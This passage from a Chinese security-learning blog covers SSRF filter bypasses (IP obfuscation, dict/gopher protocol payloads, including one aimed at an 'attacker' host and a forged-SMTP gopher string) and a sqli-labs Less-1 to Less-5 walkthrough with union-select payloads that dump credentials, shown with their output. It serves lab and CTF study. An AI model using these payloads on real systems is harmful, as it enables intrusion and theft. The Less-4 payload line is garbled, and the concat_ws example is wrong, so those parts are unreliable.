<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也不一定是上传，我也说不清，自己体会 -.-</span><br><span class="line">修改&quot;type=file&quot;为&quot;type=url&quot;</span><br><span class="line">比如：</span><br><span class="line">上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</span><br></pre></td></tr></table></figure>
<h4 id="利用enclosed-alphanumerics">利用Enclosed alphanumerics</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
<h4 id="利用句号">利用句号</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>
<h4 id="利用进制转换">利用进制转换</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以是十六进制，八进制等。</span><br><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">首先把这四段数字给分别转成16进制，结果：73efd21a</span><br><span class="line">然后把73efd21a这十六进制一起转换成8进制</span><br><span class="line">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0，跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</span><br><span class="line">八进制 http://0177.0.0.1/  &gt;&gt;&gt;  http://127.0.0.1</span><br><span class="line">十六进制 http://2130706433/ &gt;&gt;&gt;  http://127.0.0.1 </span><br></pre></td></tr></table></figure>
<h4 id="利用协议">利用协议</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure>
<h4 id="利用其他特殊地址">利用其他特殊地址</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.00.1</span><br><span class="line">127.0.01</span><br><span class="line">0.00.0</span><br><span class="line">127.1.0.1</span><br><span class="line">127.10.1</span><br><span class="line">127.1.01</span><br><span class="line">0177.1</span><br><span class="line">0177.0001.0001</span><br><span class="line">0x7f.0x0.0x0.0x1</span><br><span class="line">0177.0000.0000.0001</span><br><span class="line">0177.0001.0000.0001</span><br><span class="line">0x7f.0x1.0x0.0x1</span><br><span class="line">0x7f.0x1.0x1</span><br><span class="line">localtest.me</span><br></pre></td></tr></table></figure>
<h3 id="refer">Refer</h3>
<p><a
href="http://www.likesec.com/2017/12/28/SSRF及其绕过/">SSRF及其绕过</a></p>
<p><a
href="http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">SSRF绕过方法总结</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全SQL修炼计划 基础挑战</title>
    <url>/Study-SQLI-Basic-Challenges/</url>
    <content><![CDATA[<p><strong>Web</strong>安全修炼第一周。</p>
<h3 id="原理">原理</h3>
<p><strong>SQL</strong>注入起因于数据和代码的界限分割不明确。</p>
<span id="more"></span>
<h3 id="x00-get单查询注入">0x00 GET单查询注入</h3>
<h4 id="less-1-基于错误的get单引号字符型注入">Less-1
基于错误的GET单引号字符型注入</h4>
<p>尝试写入<strong>?id=1</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=1&#x27;</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan      </span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1 </span><br></pre></td></tr></table></figure>
<p><strong>limit
0,1</strong>表示从表中的第<strong>0</strong>个数据开始，只读取<strong>1</strong>个。</p>
<p>因为单引号未闭合导致<strong>sql</strong>语法报错，可以得出未过滤单引号的结论，则这时需要在注入的语句最后加上<strong>%23</strong>【<strong>#</strong>的<strong>url</strong>编码或是<strong>--+</strong>来闭合原构造语句末尾的分号。</p>
<p>接下来注出字段名，<strong>order
by</strong>函数是用来按照字段名排序查询，此处可以使用<strong>1</strong>、<strong>2</strong>、<strong>3</strong>等来按照字段名的序号查询，从而测试该表的字段数，若不存在该字段序号则会返回错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=1&#x27;order by 4 --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>Unknown column '4' in 'order
clause'</strong>表示在按照第四列字段排序的时候出错，则不存在第<strong>4</strong>个字段，那么该表共有<strong>3</strong>个字段。</p>
<p>使用<strong>union</strong>联合查询来同时查询多个语句，使用<strong>union</strong>联合查询时，前后两个语句查询返回的结果集需要有着相同列数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=1&#x27;  union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
<p>这里没有结果的原因是<strong>mysql_fetch_arra()</strong>函数只被调用了一次
，并没有将结果循环输出
，而<strong>mysql_fetch_arra()</strong>的作用是从结果集中取第一行作为关联数组或数字数组或二者兼有。</p>
<p>因此需要使第一行查询的结果是空，则它就会获取<strong>union</strong>联合查询后的结果渲染在网页上了。故使得<strong>id=-1</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27;  union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3 </span><br></pre></td></tr></table></figure>
<p><strong>concat(str1,str2,…)</strong>函数会拼接多个字符串，中间无分隔符，而<strong>concat_ws(separator,str1,str2,…)</strong>函数是将<strong>separator</strong>作为分隔符来拼接的多个字符串。例如<strong>select concat('1','2','3');</strong>返回的值是<strong>123</strong>，而<strong>select concat_ws('-','1','2','3');</strong>返回的值是<strong>1,2,3</strong>。</p>
<p><strong>user()</strong>函数返回当前链接的用户名，<strong>database()</strong>函数返回当前链接使用的数据库名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27;  union select 1,2,concat_ws(char(32,32),user(),database()) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:root@localhost security</span><br></pre></td></tr></table></figure>
<p>那么现在得到了一个重要的信息，即当前的表名为<strong>security</strong>。</p>
<h5 id="相关补充">相关补充</h5>
<p>补一下<strong>mysql</strong>的相关知识。</p>
<p><strong>mysql</strong>中的<strong>information_scherma</strong>从字面上来说是信息计划表，像是一个索引，又或者说这是一个目录，在这里面保存着关于<strong>mysql</strong>其他数据库的库名、表名、字段名、字段类型等等信息。</p>
<ul>
<li><p><strong>schemata</strong>表：提供了当前<strong>mysql</strong>实例中所有数据库的信息。命令<strong>show
databases;</strong>的结果取之此表。</p></li>
<li><p><strong>tables</strong>表：提供了关于数据库中的表的信息【包括视图。详细表述了某个表属于哪个<strong>schema</strong>，表类型，表引擎，创建时间等信息。命令<strong>show
tables from schemaname;</strong>的结果取之此表。</p></li>
<li><p><strong>columns</strong>表：提供了表中的列信息。命令<strong>show
columns from schemaname.tablename;</strong>的结果取之此表。</p></li>
<li><p><strong>statistics</strong>表：提供了关于表索引的信息。命令<strong>show
index from schemaname.tablename;</strong>的结果取之此表。</p></li>
<li><p><strong>user_privileges</strong>【用户权限表：给出了关于全程权限的信息。该信息源自<strong>mysql.user</strong>授权表，是非标准表。</p></li>
<li><p><strong>schema_privileges</strong>【方案权限表：给出了关于方案【数据库权限的信息。该信息来自<strong>mysql.db</strong>授权表，是非标准表。</p></li>
<li><p><strong>table_privileges</strong>【表权限表：给出了关于表权限的信息。该信息源自<strong>mysql.tables_priv</strong>授权表，是非标准表。</p></li>
<li><p><strong>column_privileges</strong>【列权限表：给出了关于列权限的信息。该信息源自<strong>mysql.columns_priv</strong>授权表。是非标准表。</p></li>
<li><p><strong>character_sets</strong>【字符集表：提供了mysql实例可用字符集的信息。命令<strong>show
character set</strong>;结果集取之此表。</p></li>
<li><p><strong>collations</strong>表：提供了关于各字符集的对照信息。</p></li>
<li><p><strong>collation_character_set_applicability</strong>表：指明了可用于校对的字符集。这些列等效于<strong>show
collation;</strong>的前两个显示字段。</p></li>
<li><p><strong>table_constraints</strong>表：描述了存在约束的表，以及表的约束类型。</p></li>
<li><p><strong>key_column_usage</strong>表：描述了具有约束的键列。</p></li>
<li><p><strong>routines</strong>表：提供了关于存储子程序【存储程序和函数的信息。此时，<strong>routines</strong>表不包含自定义函数【<strong>udf</strong>。名为<strong>mysql.proc
name</strong>的列指明了对应于<strong>information_schema.routines</strong>表的<strong>mysql.proc</strong>表列。</p></li>
<li><p><strong>views</strong>表：给出了关于数据库中的视图的信息。需要有<strong>show
views</strong>权限，否则无法查看视图信息。</p></li>
<li><p><strong>triggers</strong>表：提供了关于触发程序的信息。必须有<strong>super</strong>权限才能查看该表。</p></li>
</ul>
<p>然后继续构造式子，其中<strong>group_concat()</strong>这个函数的作用是拼接全部字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27; union select 1,TABLE_SCHEMA,group_concat(table_name) from information_schema.tables where table_schema like &#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
<p>爆所有数据名。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure>
<p>得到当前库的所有表。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure>
<p>得到表中所有的字段名。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;table_name&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>得到字段具体的值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name,<span class="string">&#x27; &#x27;</span>,column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure>
<p>得到字段名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where  table_name=&#x27;users&#x27; --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,username,password</span><br></pre></td></tr></table></figure>
<p>得到表中全部信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27; union select 1,2,group_concat(username,&#x27; &#x27;,password) from users --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4</span><br></pre></td></tr></table></figure>
<h4 id="less-2-基于错误的get整型注入">Less-2 基于错误的GET整型注入</h4>
<p>先在被挨打的边缘试探一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-2/?id=1&#x27;</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; LIMIT 0,1&#x27; at line 1 </span><br></pre></td></tr></table></figure>
<p>根据返回的错误来看，没有数值即为整型注入，因为<strong>sql</strong>语句对于数字型的数据可以不加单引号闭合，不加注释，于是构造<strong>?id=1
and 1=1</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-2/?id=1 and 1=1</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb </span><br></pre></td></tr></table></figure>
<p>有返回值，可以继续注入，后续步骤一如Less-1。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-2/?id=-1 union select 1,2,group_concat(username,&#x27; &#x27;,password) from users</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4 </span><br></pre></td></tr></table></figure>
<h4 id="less-3-基于错误的get单引号变形字符型注入">Less-3
基于错误的GET单引号变形字符型注入</h4>
<p>再次在被挨打的边缘试探一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-3/?id=1&#x27;</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1 </span><br></pre></td></tr></table></figure>
<p>可以知道后端的<strong>sql</strong>语句在接收的参数两边加上了小括号，于是构造如下语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-3/?id=-1&#x27;) or &#x27;1&#x27;=&#x27;1&#x27; --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb </span><br></pre></td></tr></table></figure>
<p>然后还是像<strong>Less-1</strong>一样的后续。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-3/?id=-1&#x27;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4 </span><br></pre></td></tr></table></figure>
<h4 id="less-4-基于错误的get双引号变形字符型注入">Less-4
基于错误的GET双引号变形字符型注入</h4>
<p>试探。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-4/?id=1&#x27;</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb </span><br></pre></td></tr></table></figure>
<p>无报错信息，故推测单引号可能被双引号包含从而闭合，因此构造双引号闭合。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-4/?id=1&quot;) or 1=1 --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb </span><br></pre></td></tr></table></figure>
<p>还是一样，故不赘述。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-4/?id=-1&quot;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--Less-4/?id=-1&quot;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--sLess-4/?id=-1&quot;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--Less-4/?id=-1&quot;) union select 1,2,group_concat(username,&#x27; &#x27;,password) from users--s+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4 </span><br></pre></td></tr></table></figure>
<h3 id="x01-get双查询注入">0x01 GET双查询注入</h3>
<h4 id="less-5-基于双查询的get单引号字符型注入">Less-5
基于双查询的GET单引号字符型注入</h4>
<p>根据题意，这是一个双查询单引号字符型注入，即将<strong>Group
by</strong>与一个聚合函数一起嵌套使用，例如**count(*)**，可以将查询的部分内容作为错误信息返回。也就发展为今天的二次注入查询。</p>
<h4 id="原理补充"><a
href="https://www.2cto.com/article/201604/498394.html">原理补充</a></h4>
<h5 id="x00-对比语句">0x00 对比语句</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(database(),floor(rand(0)*2)) as a from information_schema.tables group by a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;security1&#x27; for key &#x27;group_key</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;security1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<p>这两句查询语句的差异是<strong>floor()</strong>函数位置的不同，但多次测试的结果都是一致表明报错与语句中函数位置无关。</p>
<h5 id="x01-测试rand0">0x01 测试rand(0)</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table users(id int(10),username char(20),password char(20));</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into users(id,username,password) VALUE (1,&#x27;test1&#x27;,&#x27;test1&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from users group by concat(database(),floor(rand(0)*2));</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>执行多次没有报错，尝试增加数据再进行尝试，直到第三条数据插入后，出现了错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*) from users group by concat(database(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;test1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<h5 id="x02-测试rand">0x02 测试rand()</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table users1(id int(10),username char(20),password char(20));</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">insert into users1(id,username,password) VALUE (1,&#x27;test1&#x27;,&#x27;test1&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from users1 group by concat(database(),floor(rand()*2));</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>依旧执行多次没有报错。</p>
<p>在插入第二条数据测试后出现错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*) from users1 group by concat(database(),floor(rand()*2));</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from users1 group by concat(database(),floor(rand()*2));</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from users1 group by concat(database(),floor(rand()*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;test0&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<h5 id="x03-多数据测试">0x03 多数据测试</h5>
<p>使用<strong>rand()</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select floor(rand()*2) from users;</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*2) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(rand()*2) from users;</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*2) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">+-----------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(rand()*2) from users;</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*2) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               1 |</span><br><span class="line">|               0 |</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>多次测试发现结果都不同，然后使用<strong>rand(0)</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from users;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(rand(0)*2) from users;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select floor(rand(0)*2) from users;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>多次测试结果一样。</p>
<h5 id="x04-虚拟表">0x04 虚拟表</h5>
